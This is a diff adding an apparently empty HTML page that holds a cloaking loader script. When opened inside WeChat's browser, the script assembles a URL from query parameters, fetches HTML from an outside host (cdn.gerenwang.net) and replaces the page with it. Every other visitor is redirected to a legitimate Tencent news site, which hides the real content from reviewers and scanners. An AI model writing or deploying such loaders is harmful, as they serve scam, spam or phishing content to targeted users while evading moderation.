@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"/>
+	<title>     </title>
+	<script type="text/javascript">
+		(function() {
+			function g(n){
+			    var x = new RegExp("(^|&)"+ n +"=([^&]*)(&|$)");
+			    var r = window.location.search.substr(1).match(x);
+			    if(r!=null)return  unescape(r[2]); return null;
+			}
+            var x = new XMLHttpRequest;
+            var h = null;
+            function r() {
+                var a = document.open("text/html", "replace");
+                a.write(h);
+                a.close();
+            }
+			function l(n) {
+				top.location.href = 'https://xw.qq.com/?f=qqcom';
+			}
+			var ua = navigator.userAgent.toLowerCase();
+			if (/micromessenger/.test(ua)) {
+			    window.setTimeout(function() {
+					var c = null;
+					var d = '';
+					for(var i=0;i<26;i++){
+						c = g(String.fromCharCode(97+i));
+						if(!!c){
+							d += '/' + c;
+						}else{
+							break;
+						}
+					}
+					var t = 'http://'+'cdn.gerenwang.net'+d+'.html';
+					window.kaztoa = d;
+					window.kaztoy = g('y');
+					if(!!g('yxz')) {
+                        window.kaztoyxz = g('yxz');
+					}
+					if(!!t){
+                        x.onload = function() {
+                            h = x.responseText;
+                            var d = 0;
+                            if (d > 0) setTimeout("r()", d * 1000);
+                            else r();
+                        };
+                        x.open("GET", t+"?t=" + Date.now(), !0);
+                        x.send();
+					}
+				}, 0)
+			} else {
+				l()
+			}
+		})()
+	</script>
+</head>
+<body>
+</body>
+</html>
